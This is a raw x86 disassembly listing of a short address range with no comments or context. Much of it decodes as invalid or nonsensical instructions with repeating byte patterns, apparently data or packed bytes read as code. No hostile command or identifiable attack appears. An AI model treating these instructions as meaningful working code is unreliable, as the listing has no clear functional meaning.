  41f1e7:	das    
  41f1e8:	and    DWORD PTR [ebp+0x21],esi
  41f1eb:	and    ebp,DWORD PTR ds:0x3e3e3e79
  41f1f1:	jge    0x41f1b5
  41f1f3:	ret    0x81c2
  41f1f6:	mov    dh,0xc6
  41f1f9:	test   edx,ecx
  41f1fb:	retf   0x89ca
  41f1fe:	into   
  41f1ff:	into   
  41f200:	into   
  41f201:	(bad)  
  41f202:	rcl    dl,cl
  41f204:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41f20a:	cld    
  41f20b:	cld    
  41f20c:	clc    
  41f20d:	cdq    
  41f20e:	dec    eax
  41f20f:	dec    eax
  41f210:	dec    esp
  41f211:	popf   
  41f212:	push   esi
  41f213:	push   esi
  41f214:	push   esi
  41f215:	mov    eax,ds:0xa5525252
  41f21a:	push   eax
  41f21b:	push   eax
  41f21c:	pop    esp
  41f21d:	test   eax,0xac50acac
  41f222:	mov    al,0xb0
  41f224:	dec    esp
  41f225:	mov    al,0xb4
  41f227:	mov    ah,0x48
  41f229:	mov    ah,0xb8
  41f22b:	mov    eax,0xbcbcb844
  41f230:	inc    eax
  41f231:	mov    esp,0xc1363636
  41f236:	xor    dh,BYTE PTR [edx]
  41f238:	xor    al,ch
  41f23a:	ds ds ds leave 
  41f23e:	push   eax
  41f23f:	push   eax
  41f240:	push   esp
  41f241:	int    0x92
  41f243:	xchg   edx,eax
  41f244:	xchg   edx,eax
  41f245:	rcl    DWORD PTR [esi-0x652a696a],1
  41f24b:	call   0xdd9e:0x9e9ed99a
  41f252:	mov    ds:0xa6e1a2a2,al
  41f257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f259:	in     eax,0xaa
  41f25b:	stos   BYTE PTR es:[edi],al
  41f25c:	stos   BYTE PTR es:[edi],al
  41f25d:	jmp    0xedf0a110
  41f262:	mov    dl,0xb2
  41f264:	mov    dl,0xf1
  41f266:	cmp    eax,0x46f5313f
  41f26b:	inc    esi
  41f26c:	inc    esi
  41f26d:	stc    
  41f26e:	mov    esi,0x42fdbebe
  41f273:	inc    edx
  41f274:	inc    edx
  41f275:	add    DWORD PTR [esi+0x46],eax
  41f278:	inc    esi
  41f279:	add    eax,0x94a4a4a
  41f27e:	dec    esi
  41f27f:	dec    esi
  41f280:	dec    esi
  41f281:	or     eax,0x11525252
  41f286:	push   esi
  41f287:	push   esi
  41f288:	push   esi
  41f289:	adc    eax,0x195a5a5a
  41f28e:	pop    esi
  41f28f:	pop    esi
  41f290:	pop    esi
  41f291:	sbb    eax,0x21b8bcbc
  41f296:	rcl    dl,cl
  41f298:	shl    BYTE PTR ds:0x29dedede,cl
  41f29e:	fcmovu st,st(2)
  41f2a0:	fisubr DWORD PTR ds:0x30cc3030
  41f2a6:	xor    al,0x34
  41f2a8:	enter  0x3834,0x38
  41f2ac:	les    edi,FWORD PTR [eax]
  41f2ae:	retf   0xcaca
  41f2b1:	cmp    eax,0x41b6b6b6
  41f2b6:	mov    dl,0xb2
  41f2b8:	mov    dl,0x45
  41f2ba:	mov    esi,0xff49bebe
  41f2bf:	stc    
  41f2c0:	dec    DWORD PTR [ebp+0x3f]
  41f2c3:	and    DWORD PTR [edi],edi
  41f2c5:	push   ecx
  41f2c6:	push   ss
  41f2c7:	push   ss
  41f2c8:	push   ss
  41f2c9:	push   ebp
  41f2ca:	sbb    bl,BYTE PTR [edx]
  41f2cc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41f2cf:	push   ds
  41f2d0:	push   ds
  41f2d1:	pop    ebp
  41f2d2:	and    ah,BYTE PTR [edx]
  41f2d4:	and    ah,BYTE PTR [ecx+0x26]
  41f2d7:	es es sub ch,BYTE PTR gs:[edx]
  41f2dc:	sub    ch,BYTE PTR [ecx+0x2e]
  41f2df:	cs cs ins DWORD PTR es:[edi],dx
  41f2e2:	or     cl,BYTE PTR [edx]
  41f2e4:	or     dh,BYTE PTR [ecx-0x7e]
  41f2e7:	add    BYTE PTR [edx-0x7171718b],0x79
  41f2ee:	adc    ecx,DWORD PTR ds:0xc2c27d13
  41f2f4:	ret    0xc681
  41f2f7:	mov    dh,0x85
  41f2fa:	retf   0xcaca
  41f2fd:	mov    esi,ecx
  41f2ff:	into   
  41f300:	into   
  41f301:	(bad)  
  41f302:	rcl    dl,cl
  41f304:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41f30a:	fcmovu st,st(2)
  41f30c:	ficomp DWORD PTR [ecx-0x620c120d]
  41f312:	adc    edx,DWORD PTR ds:0x5252a113
  41f318:	push   edx
  41f319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31a:	pop    esi
  41f31b:	pop    esi
  41f31c:	pop    esi
  41f31d:	test   eax,0xad5a5a5a
  41f322:	inc    esi
  41f323:	inc    esi
  41f324:	inc    esi
  41f325:	mov    cl,0xb4
  41f327:	mov    ah,0x48
  41f329:	mov    ah,0xb8
  41f32b:	mov    eax,0xbcbcb844
  41f330:	inc    eax
  41f331:	mov    esp,0xc03cc0c0
  41f336:	cmp    al,0x3c
  41f338:	xor    ch,al
  41f33a:	ds ds ds leave 
  41f33e:	cmp    bh,BYTE PTR [edx]
  41f340:	cmp    cl,ch
  41f342:	es es shl DWORD PTR es:[esp+esi*1],1
  41f348:	or     ch,dl
  41f34a:	inc    esp
  41f34b:	inc    esp
  41f34c:	inc    eax
  41f34d:	fld    DWORD PTR [ebp-0x5d227679]
  41f353:	mov    ds:0xa6a6e1a2,al
  41f358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f359:	in     eax,0xaa
  41f35b:	stos   BYTE PTR es:[edi],al
  41f35c:	stos   BYTE PTR es:[edi],al
  41f35d:	jmp    0xede79703
  41f362:	adc    BYTE PTR [eax],dl
  41f364:	sub    al,0xf1
  41f366:	add    al,BYTE PTR [edx]
  41f368:	add    dh,ch
  41f36a:	push   cs
  41f36b:	push   cs
  41f36c:	push   cs
  41f36d:	stc    
  41f36e:	sbb    al,0x1c
  41f370:	and    ch,bh
  41f372:	inc    edx
  41f373:	inc    edx
  41f374:	inc    edx
  41f375:	add    DWORD PTR [esi+0x46],eax
  41f378:	inc    esi
  41f379:	add    eax,0x94a4a4a
  41f37e:	dec    esi
  41f37f:	dec    esi
  41f380:	dec    esi
  41f381:	or     eax,0x11454b49
  41f386:	mov    BYTE PTR [eax-0x707ea74],cl
  41f38c:	les    ebx,FWORD PTR [ecx]
  41f38e:	jmp    0xd6d6:0xd61deaea
  41f395:	and    edx,edx
  41f397:	rcl    dl,cl
  41f399:	and    eax,0x29dcd0d0
  41f39e:	sub    al,0x2c
  41f3a0:	shr    BYTE PTR [eax+esi*1],1
  41f3a3:	xor    ah,cl
  41f3a5:	xor    BYTE PTR [esp+esi*1],dh
  41f3a8:	enter  0x3834,0x38
  41f3ac:	les    edi,FWORD PTR [eax]
  41f3ae:	cmp    al,0x3c
  41f3b0:	sar    BYTE PTR [eax+eax*2],0x40
  41f3b4:	mov    esp,0xb8444440
  41f3b9:	inc    esp
  41f3ba:	dec    eax
  41f3bb:	dec    eax
  41f3bc:	mov    ah,0x48
  41f3be:	mov    ah,0xb4
  41f3c0:	mov    eax,0xa6a6a64d
  41f3c5:	push   ecx
  41f3c6:	mov    ds:0xae55a2a2,al
  41f3cb:	scas   al,BYTE PTR es:[edi]
  41f3cc:	scas   al,BYTE PTR es:[edi]
  41f3cd:	pop    ecx
  41f3ce:	stos   BYTE PTR es:[edi],al
  41f3cf:	stos   BYTE PTR es:[edi],al
  41f3d0:	stos   BYTE PTR es:[edi],al
  41f3d1:	pop    ebp
  41f3d2:	test   eax,0xe261a5ab
  41f3d7:	loop   0x41f3bb
  41f3d9:	gs and eax,0xf0692127
  41f3df:	lock hlt 
  41f3e1:	ins    DWORD PTR es:[edi],dx
  41f3e2:	xchg   BYTE PTR [esi-0x7d7d8e7a],al
  41f3e8:	xor    BYTE PTR [ebp-0x72],0x8e
  41f3ec:	mov    ?,WORD PTR [ecx-0x76]
  41f3ef:	mov    cl,BYTE PTR [edx+0x181c1c7d]
  41f3f5:	or     ecx,0xe85cdcb
  41f3fb:	push   cs
  41f3fc:	push   cs
  41f3fd:	mov    DWORD PTR [ebp+0x47],eax
  41f400:	dec    ecx
  41f401:	lea    esp,[esi+0x66]
  41f404:	xchg   cx,ax
  41f406:	bound  esp,QWORD PTR [edx+0x62]
  41f409:	xchg   ebp,eax
  41f40a:	outs   dx,BYTE PTR ds:[esi]
  41f40b:	outs   dx,BYTE PTR ds:[esi]
  41f40c:	outs   dx,BYTE PTR ds:[esi]
  41f40d:	cdq    
  41f40e:	push   0x6a
  41f410:	push   0xffffff9d
  41f412:	pop    eax
  41f413:	pop    eax
  41f414:	push   esp
  41f415:	mov    eax,ds:0xa458a4a4
  41f41a:	test   al,0xa8
  41f41c:	push   esp
  41f41d:	test   al,0xac
  41f41f:	lods   al,BYTE PTR ds:[esi]
  41f420:	push   eax
  41f421:	lods   al,BYTE PTR ds:[esi]
  41f422:	mov    al,0xb0
  41f424:	dec    esp
  41f425:	mov    al,0xb4
  41f427:	mov    ah,0x48
  41f429:	mov    ah,0xb8
  41f42b:	mov    eax,0xbcbcb844
  41f430:	inc    eax
  41f431:	mov    esp,0xc03cc0c0
  41f436:	(bad)  
  41f437:	les    edi,FWORD PTR [eax]
  41f439:	(bad)  
  41f43a:	enter  0x34c8,0xc8
  41f43e:	int3   
  41f43f:	int3   
  41f440:	xor    ah,cl
  41f442:	rcl    al,1
  41f444:	sub    al,0xd0
  41f446:	aam    0xd4
  41f448:	sub    ah,dl
  41f44a:	and    BYTE PTR [eax],ah
  41f44c:	sub    al,0xd9
  41f44e:	sub    ch,BYTE PTR [edx]
  41f450:	sub    bl,ch
  41f452:	push   ss
  41f453:	push   ss
  41f454:	push   ss
  41f455:	loope  0x41f469
  41f457:	adc    dl,BYTE PTR [edx]
  41f459:	in     eax,0x3
  41f45b:	add    eax,0x1a1ae903
  41f460:	sbb    ch,ch
  41f462:	push   es
  41f463:	push   es
  41f464:	push   es
  41f465:	icebp  
  41f466:	hlt    
  41f467:	hlt    
  41f468:	or     ah,dh
  41f46a:	clc    
  41f46b:	clc    
  41f46c:	add    al,0xf8
  41f46e:	or     cl,BYTE PTR [edx]
  41f470:	or     bh,ch
  41f472:	jmp    0x41f461
  41f474:	jmp    0x41f477
  41f476:	out    dx,eax
  41f477:	jmp    0xff3ffa6b
  41f47c:	dec    BYTE PTR [ecx]
  41f47e:	cli    
  41f47f:	cli    
  41f480:	cli    
  41f481:	or     eax,0x11e6e6e6
  41f486:	in     al,dx
  41f487:	in     al,dx
  41f488:	loopne 0x41f49f
  41f48a:	sbb    BYTE PTR [eax],bl
  41f48c:	in     al,0x18
  41f48e:	sbb    al,0x1c
  41f490:	loopne 0x41f4ae
  41f492:	and    BYTE PTR [eax],ah
  41f494:	fsub   QWORD PTR [eax]
  41f496:	and    al,0x24
  41f498:	fsub   DWORD PTR [eax+ebp*1]
  41f49b:	sub    ah,dl
  41f49d:	sub    BYTE PTR [esp+ebp*1],ch
  41f4a0:	shr    BYTE PTR [eax+esi*1],1
  41f4a3:	xor    ah,cl
  41f4a5:	xor    BYTE PTR [esp+esi*1],dh
  41f4a8:	enter  0x3834,0x38
  41f4ac:	les    edi,FWORD PTR [eax]
  41f4ae:	cmp    al,0x3c
  41f4b0:	sar    BYTE PTR [eax+eax*2],0x40
  41f4b4:	mov    esp,0xb8444440
  41f4b9:	inc    esp
  41f4ba:	dec    eax
  41f4bb:	dec    eax
  41f4bc:	mov    ah,0x48
  41f4be:	dec    esp
  41f4bf:	dec    esp
  41f4c0:	mov    al,0x4c
  41f4c2:	push   eax
  41f4c3:	push   eax
  41f4c4:	lods   al,BYTE PTR ds:[esi]
  41f4c5:	push   eax
  41f4c6:	push   esp
  41f4c7:	push   esp
  41f4c8:	test   al,0x54
  41f4ca:	pop    eax
  41f4cb:	pop    eax
  41f4cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4cd:	pop    eax
  41f4ce:	pop    esp
  41f4cf:	pop    esp
  41f4d0:	mov    al,ds:0x9c60605c
  41f4d5:	pusha  
  41f4d6:	pushf  
  41f4d7:	pushf  
  41f4d8:	nop
  41f4d9:	gs sahf 
  41f4db:	sahf   
  41f4dc:	sahf   
  41f4dd:	imul   ebx,DWORD PTR [edx-0x77926566],0x74718488
  41f4e7:	je     0x41f471
  41f4e9:	je     0x41f563
  41f4eb:	js     0x41f471
  41f4ed:	js     0x41f473
  41f4ef:	test   BYTE PTR [eax+0x7676767d],cl
  41f4f5:	xor    DWORD PTR [edx+0x72],0x70708572
  41f4fc:	jl     0x41f487
  41f4fe:	mov    WORD PTR [eax+esi*2+0x6c90908c],cs
  41f505:	nop
  41f506:	xchg   esp,eax
  41f507:	xchg   esp,eax
  41f508:	push   0x64989894
  41f50d:	cwde   
  41f50e:	pushf  
  41f50f:	pushf  
  41f510:	pusha  
  41f511:	pushf  
  41f512:	mov    al,ds:0xa4a05ca0
  41f517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f518:	pop    eax
  41f519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f51a:	test   al,0xa8
  41f51c:	push   esp
  41f51d:	test   al,0xac
  41f51f:	lods   al,BYTE PTR ds:[esi]
  41f520:	push   eax
  41f521:	lods   al,BYTE PTR ds:[esi]
  41f522:	mov    al,0xb0
  41f524:	dec    esp
  41f525:	mov    al,0xb4
  41f527:	mov    ah,0x48
  41f529:	mov    ah,0x58
  41f52b:	mov    eax,0xbc5cb144
  41f530:	inc    eax
  41f531:	mov    ch,0x20
  41f533:	sar    BYTE PTR [ecx+ecx*8],0x24
  41f537:	les    edi,FWORD PTR [eax]
  41f539:	int    0x28
  41f53b:	enter  0xc134,0x2c
  41f53f:	int3   
  41f540:	xor    ch,al
  41f542:	xor    al,dl
  41f544:	sub    al,0xd9
  41f546:	xor    al,0xd4
  41f548:	sub    ch,bl
  41f54a:	cmp    al,bl
  41f54c:	and    al,0xd1
  41f54e:	cmp    al,0xdc
  41f550:	and    ch,dl
  41f552:	add    al,ah
  41f554:	sbb    al,0xe9
  41f556:	add    al,0xe4
  41f558:	sbb    ch,ch
  41f55a:	or     al,ch
  41f55c:	adc    al,0xe1
  41f55e:	or     al,0xec
  41f560:	adc    ch,ah
  41f562:	adc    al,dh
  41f564:	or     al,0xf9
  41f566:	adc    al,0xf4
  41f568:	or     ch,bh
  41f56a:	sbb    al,bh
  41f56c:	add    al,0xf1
  41f56e:	sbb    al,0xfc
  41f570:	add    ch,dh
  41f572:	loopne 0x41f574
  41f574:	cld    
  41f575:	or     esp,esp
  41f577:	add    al,0xf8
  41f579:	or     eax,0x1f408e8
  41f57e:	in     al,dx
  41f57f:	or     al,0xf0
  41f581:	add    eax,0x19ec10f0
  41f586:	hlt    
  41f587:	adc    al,0xe8
  41f589:	sbb    eax,0x11e418f8
  41f58e:	cld    
  41f58f:	sbb    al,0xe0
  41f591:	adc    eax,0x25dc20e0
  41f596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f597:	and    al,0xd8
  41f599:	and    ecx,eax
  41f59b:	sub    ah,dl
  41f59d:	and    esp,edx
  41f59f:	sub    al,0xd0
  41f5a1:	or     eax,0x314c33cf
  41f5a6:	retf   
  41f5a7:	xlat   BYTE PTR ds:[ebx]
  41f5a8:	mov    bl,0x35
  41f5aa:	cmp    BYTE PTR [eax],bh
  41f5ac:	lds    edi,FWORD PTR [eax]
  41f5ae:	aas    
  41f5af:	cmp    al,0x20
  41f5b1:	sbb    al,0x50
  41f5b3:	inc    eax
  41f5b4:	mov    ebp,0xa0444040
  41f5b9:	inc    edx
  41f5ba:	dec    eax
  41f5bb:	dec    eax
  41f5bc:	mov    ch,0x48
  41f5be:	ins    BYTE PTR es:[edi],dx
  41f5bf:	ins    BYTE PTR es:[edi],dx
  41f5c0:	mov    al,0x4c
  41f5c2:	push   ecx
  41f5c3:	push   eax
  41f5c4:	push   esp
  41f5c5:	push   eax
  41f5c6:	cld    
  41f5c7:	pop    esp
  41f5c8:	test   al,0x54
  41f5ca:	pop    edx
  41f5cb:	pop    eax
  41f5cc:	inc    esp
  41f5cd:	js     0x41f62b
  41f5cf:	pop    esp
  41f5d0:	mov    eax,ds:0xc460405c
  41f5d5:	jo     0x41f63b
  41f5d7:	fs addr16 fs push 0x6c689468
  41f5df:	ins    BYTE PTR es:[edi],dx
  41f5e0:	nop
  41f5e1:	ins    BYTE PTR es:[edi],dx
  41f5e2:	sbb    al,0xb8
  41f5e4:	mov    WORD PTR [eax+0x74],?
  41f5e7:	je     0x41f571
  41f5e9:	je     0x41f663
  41f5eb:	js     0x41f571
  41f5ed:	js     0x41f66b
  41f5ef:	jl     0x41f571
  41f5f1:	jl     0x41f61f
  41f5f3:	into   
  41f5f4:	add    DWORD PTR [eax-0x7b7835c8],0x58
  41f5fb:	(bad)  
  41f5fc:	mov    ecx,DWORD PTR [eax-0x73703d94]
  41f602:	nop
  41f603:	nop
  41f604:	ins    BYTE PTR es:[edi],dx
  41f605:	nop
  41f606:	push   0x989497da
  41f60b:	cwde   
  41f60c:	fs cwde 
  41f60e:	or     ch,0x9f
  41f611:	pushf  
  41f612:	mov    al,ds:0xe4a05ca0
  41f617:	cmc    
  41f618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f61a:	test   al,0xa8
  41f61c:	push   esp
  41f61d:	test   al,0xcc
  41f61f:	std    
  41f620:	scas   eax,DWORD PTR es:[edi]
  41f621:	lods   al,BYTE PTR ds:[esi]
  41f622:	mov    al,0xb0
  41f624:	dec    esp
  41f625:	mov    al,0xb6
  41f627:	mov    ah,0x48
  41f629:	xor    al,0xb8
  41f62b:	mov    eax,0xed2cb844
  41f630:	mov    edi,0x3cc0c0bc
  41f635:	rcl    ch,0xc4
  41f638:	cmp    BYTE PTR [eax+ecx*8-0x38],al
  41f63c:	xor    al,0xc8
  41f63e:	or     al,0x9d
  41f640:	iret   
  41f641:	int3   
  41f642:	rcl    al,1
  41f644:	sub    al,0xd0
  41f646:	push   esp
  41f647:	fwait
  41f648:	xlat   BYTE PTR ds:[ebx]
  41f649:	aam    0xd8
  41f64b:	fsub   DWORD PTR [eax+ebx*8]
  41f64e:	and    ebx,ebp
  41f650:	and    ebx,ebp
  41f652:	jl     0x41f602
  41f654:	jecxz  0x41f636
  41f656:	fs stos DWORD PTR es:[edi],eax
  41f658:	out    0xe4,eax
  41f65a:	jl     0x41f603
  41f65c:	jmp    0x41f646
  41f65e:	in     al,dx
  41f65f:	in     al,dx
  41f660:	adc    ah,ch
  41f662:	psllw  mm1,QWORD PTR [edi]
  41f665:	icebp  
  41f666:	add    al,0xba
  41f668:	div    esp
  41f66a:	ins    BYTE PTR es:[edi],dx
  41f66b:	mov    bh,0xfb
  41f66d:	clc    
  41f66e:	pusha  
  41f66f:	mov    bl,0xff
  41f671:	cld    
  41f672:	add    BYTE PTR [eax],al
  41f674:	cld    
  41f675:	add    bl,bh
  41f677:	add    eax,0x591805fb
  41f67c:	or     ecx,DWORD PTR [eax]
  41f67e:	nop
  41f67f:	inc    ebx
  41f680:	(bad)  
  41f682:	mov    ah,0x5f
  41f684:	adc    edx,DWORD PTR [eax]
  41f686:	adc    al,0x14
  41f688:	call   0xe75bdda1
  41f68d:	sbb    DWORD PTR [ecx*2+0x6f841c1f],ebp
  41f694:	and    esp,DWORD PTR [eax]
  41f696:	mov    BYTE PTR [ebx+0x27],ch
  41f699:	and    al,0x28
  41f69b:	sub    ah,dl
  41f69d:	sub    bl,dl
  41f69f:	sub    eax,0x61642dd3
  41f6a4:	xor    esi,DWORD PTR [eax]
  41f6a6:	cwde   
  41f6a7:	jnp    0x41f6e0
  41f6a9:	xor    al,0x8c
  41f6ab:	ja     0x41f6e8
  41f6ad:	cmp    BYTE PTR [esp+edi*1],bh
  41f6b0:	sar    BYTE PTR [edi+edi*4],0x41
  41f6b4:	mov    edi,0x47153041
  41f6b9:	inc    esp
  41f6ba:	cld    
  41f6bb:	pop    es
  41f6bc:	dec    ebx
  41f6bd:	dec    eax
  41f6be:	lock add ecx,DWORD PTR [edi+0x4c]
  41f6c2:	push   eax
  41f6c3:	push   eax
  41f6c4:	lods   al,BYTE PTR ds:[esi]
  41f6c5:	push   eax
  41f6c6:	stos   DWORD PTR es:[edi],eax
  41f6c7:	push   ebp
  41f6c8:	stos   DWORD PTR es:[edi],eax
  41f6c9:	push   ebp
  41f6ca:	fmul   QWORD PTR [ecx]
  41f6cc:	pop    ebx
  41f6cd:	pop    eax
  41f6ce:	loopne 0x41f6e3
  41f6d0:	pop    edi
  41f6d1:	pop    esp
  41f6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d3:	das    
  41f6d4:	arpl   WORD PTR [eax+0x64],sp
  41f6d7:	fs cwde 
  41f6d9:	fs xchg edi,eax
  41f6db:	imul   edx,DWORD PTR [edi+0x6f3dcc69],0x733fb46c
  41f6e5:	jo     0x41f69f
  41f6e7:	cmp    esi,DWORD PTR [edi+0x74]
  41f6ea:	js     0x41f764
  41f6ec:	test   BYTE PTR [eax-0x7d],bh
  41f6ef:	jge    0x41f674
  41f6f1:	jge    0x41f723
  41f6f3:	rol    DWORD PTR [ebx-0x7834b780],1
  41f6f9:	test   BYTE PTR [eax-0x73778b78],cl
  41f6ff:	mov    WORD PTR [eax-0x74],?
  41f702:	nop
  41f703:	nop
  41f704:	ins    BYTE PTR es:[edi],dx
  41f705:	nop
  41f706:	xchg   esp,eax
  41f707:	xchg   esp,eax
  41f708:	push   0x64989894
  41f70d:	cwde   
  41f70e:	idiv   ebx
  41f710:	out    dx,al
  41f711:	out    dx,al
  41f712:	(bad)
  41f715:	xchg   esi,eax
  41f716:	mov    al,al
  41f718:	int3   
  41f719:	enter  0xa8a8,0x54
  41f71d:	test   al,0xac
  41f71f:	lods   al,BYTE PTR ds:[esi]
  41f720:	in     al,0xdd
  41f722:	rcl    esp,1
  41f724:	clc    
  41f725:	(bad)  
  41f727:	(bad)  
  41f728:	jmp    0x453db8ef
  41f72d:	mov    eax,0xd7fbbcbc
  41f732:	mov    ah,0x90
  41f734:	mov    dl,0xb1
  41f736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f737:	xchg   DWORD PTR [eax+eiz*4-0x42445046],esp
  41f73e:	int3   
  41f73f:	int3   
  41f740:	xor    ah,cl
  41f742:	rcl    al,1
  41f744:	xchg   BYTE PTR [edi-0x4c5a5f5a],bh
  41f74a:	mov    ah,0x9b
  41f74c:	mov    al,0xb4
  41f74e:	mov    bl,0xb9
  41f750:	and    ah,bl
  41f752:	loopne 0x41f734
  41f754:	mov    dh,0x8f
  41f756:	xchg   esi,eax
  41f757:	nop
  41f758:	xchg   ebp,eax
  41f759:	add    DWORD PTR [esi+ebp*4-0x13767c66],0x10
  41f761:	in     al,dx
  41f762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f764:	mov    cl,0xa6
  41f766:	mov    esi,0x949490da
  41f76c:	add    al,0xf8
  41f76e:	cld    
  41f76f:	cld    
  41f770:	mov    ebx,0x61447497
  41f775:	jne    0x41f7e6
  41f777:	jo     0x41f7e4
  41f779:	je     0x41f7da
  41f77b:	arpl   WORD PTR [esi+0x6c],sp
  41f77e:	arpl   WORD PTR [ebp-0x10],si
  41f781:	or     al,0x57
  41f783:	push   esp
  41f784:	push   ebp
  41f785:	and    eax,0x78743a26
  41f78a:	je     0x41f7a4
  41f78c:	in     al,0x18
  41f78e:	sbb    al,0x1c
  41f790:	pop    ebx
  41f791:	ja     0x41f7e7
  41f793:	jne    0x41f7e5
  41f795:	push   ecx
  41f796:	inc    edi
  41f797:	dec    ecx
  41f798:	imul   eax,DWORD PTR [edx+0x42],0x4f
  41f79c:	dec    ebx
  41f79d:	pop    esp
  41f79e:	sub    al,0x2c
  41f7a0:	shr    BYTE PTR [ecx+esi*2],1
  41f7a3:	je     0x41f80b
  41f7a5:	ja     0x41f80b
  41f7a7:	jg     0x41f7b0
  41f7a9:	add    dl,BYTE PTR [esi]
  41f7ab:	pop    esp
  41f7ac:	push   eax
  41f7ad:	push   esp
  41f7ae:	cmp    al,0x3c
  41f7b0:	sar    BYTE PTR [eax+eax*2],0x40
  41f7b4:	add    esi,DWORD PTR [esi]
  41f7b6:	cmp    eax,0x2d113434
  41f7bb:	cmp    al,0x3
  41f7bd:	and    esi,DWORD PTR ds:0x313a111c
  41f7c3:	aas    
  41f7c4:	lods   al,BYTE PTR ds:[esi]
  41f7c5:	push   eax
  41f7c6:	cmp    edi,DWORD PTR [eax]
  41f7c8:	xor    eax,0x38766a61
  41f7cd:	xor    al,0x30
  41f7cf:	pop    esp
  41f7d0:	mov    al,ds:0x2360605c
  41f7d5:	adc    DWORD PTR [edi],esp
  41f7d7:	push   ss
  41f7d8:	add    eax,0x2d0f1c03
  41f7dd:	sbb    bl,BYTE PTR [edi]
  41f7df:	sbb    BYTE PTR [ecx],dh
  41f7e1:	push   ds
  41f7e2:	adc    edx,DWORD PTR [edi]
  41f7e4:	mov    WORD PTR [eax+0x3b],?
  41f7e7:	cmp    BYTE PTR ds:0x4b2c2d33,dh
  41f7ed:	dec    esi
  41f7ee:	push   edx
  41f7ef:	sbb    BYTE PTR [eax+edx*1],dl
  41f7f2:	add    BYTE PTR [eax-0x33287f84],0xcc
  41f7f9:	(bad)  
  41f7fb:	fmul   st,st(5)
  41f7fd:	mov    edx,0x8ce4e0e8
  41f802:	nop
  41f803:	nop
  41f804:	ret    
  41f805:	in     al,0xe6
  41f807:	sar    bl,0xdb
  41f80a:	imul   ah
  41f80c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f80d:	cwde   
  41f80e:	pushf  
  41f80f:	pushf  
  41f810:	pusha  
  41f811:	pushf  
  41f812:	jecxz  0x41f805
  41f814:	jmp    0x982ae8fe
  41f819:	xchg   edx,eax
  41f81a:	xchg   ah,cl
  41f81c:	rol    ah,0xac
  41f81f:	lods   al,BYTE PTR ds:[esi]
  41f820:	push   eax
  41f821:	lods   al,BYTE PTR ds:[esi]
  41f822:	(bad)  
  41f823:	mul    eax
  41f825:	mul    esp
  41f827:	inc    DWORD PTR [edi-0x2f23697e]
  41f82d:	aam    0xbc
  41f82f:	mov    esp,0xc0c0bc40
  41f834:	mov    gs,WORD PTR [ebx-0x50486c50]
  41f83a:	mov    edx,0xa1b3a68f
  41f83f:	int3   
  41f840:	xor    BYTE PTR [ebp-0x25],bh
  41f843:	rcr    ch,cl
  41f845:	out    0x29,al
  41f847:	mov    al,ds:0xc2c761d5
  41f84c:	mov    dh,0xa2
  41f84e:	mov    al,ds:0x45cddb13
  41f853:	xchg   esp,eax
  41f854:	jecxz  0x41f89b
  41f856:	and    eax,eax
  41f858:	mov    DWORD PTR [esi+0x3d],0xae4aeb3b
  41f85f:	leave  
  41f860:	fbstp  TBYTE PTR [edi]
  41f862:	and    al,0xb4
  41f864:	or     al,0xf0
  41f866:	cld    
  41f867:	pop    ss
  41f868:	mov    al,0xf3
  41f86a:	adc    eax,ecx
  41f86c:	psllw  mm6,mm6
  41f86f:	stos   DWORD PTR es:[edi],eax
  41f870:	ja     0x41f882
  41f872:	jb     0x41f7f9
  41f874:	jno    0x41f8aa
  41f876:	cmp    BYTE PTR [ebx+0x0],al
  41f879:	cmp    eax,DWORD PTR [eax-0xd]
  41f87c:	cmp    al,0x63
  41f87e:	cld    
  41f87f:	gs or  ah,dh
  41f882:	adc    BYTE PTR ds:0x1d4756c2,ah
  41f888:	inc    edx
  41f889:	cdq    
  41f88a:	push   0xc65f4f14
  41f88f:	leave  
  41f890:	(bad)  
  41f891:	mov    esi,0xa3d42410
  41f896:	pop    ebp
  41f897:	fcompp 
  41f899:	int    0xa1
  41f89b:	outs   dx,DWORD PTR ds:[esi]
  41f89c:	clc    
  41f89d:	sub    eax,0x86ef94e4
  41f8a2:	pop    eax
  41f8a3:	enter  0x71ec,0x7f
  41f8a7:	xor    cl,BYTE PTR gs:[edi-0x2c]
  41f8ab:	aas    
  41f8ac:	push   cs
  41f8ad:	mov    edi,0x317dfa20
  41f8b2:	jle    0x41f915
  41f8b4:	sbb    DWORD PTR [eax-0x7173c476],edx
  41f8ba:	sbb    eax,0xac084ea0
  41f8bf:	test   al,0x30
  41f8c1:	nop
  41f8c2:	and    al,0x62
  41f8c4:	pop    ebx
  41f8c5:	fld    QWORD PTR [ebx]
  41f8c7:	push   eax
  41f8c8:	pop    edx
  41f8c9:	mov    cl,0xa6
  41f8cb:	lods   eax,DWORD PTR ds:[esi]
  41f8cc:	repz popa 
  41f8ce:	out    0x50,al
  41f8d0:	hlt    
  41f8d1:	push   ds
  41f8d2:	data16 or ah,BYTE PTR [ecx-0x1c]
  41f8d6:	sbb    eax,0x97ac6398
  41f8db:	xor    esp,ebx
  41f8dd:	adc    edx,DWORD PTR [edx]
  41f8df:	or     al,0x3d
  41f8e1:	pusha  
  41f8e2:	jg     0x41f8aa
  41f8e4:	inc    esi
  41f8e5:	jne    0x41f89c
  41f8e7:	xchg   esi,eax
  41f8e8:	jo     0x41f963
  41f8ea:	scas   al,BYTE PTR es:[edi]
  41f8eb:	jns    0x41f93c
  41f8ed:	push   esi
  41f8ee:	xor    eax,0x69079018
  41f8f3:	mov    ebx,0xfd9cbdc9
  41f8f8:	clc    
  41f8f9:	mov    cl,0x48
  41f8fb:	jmp    0x4e87ced6
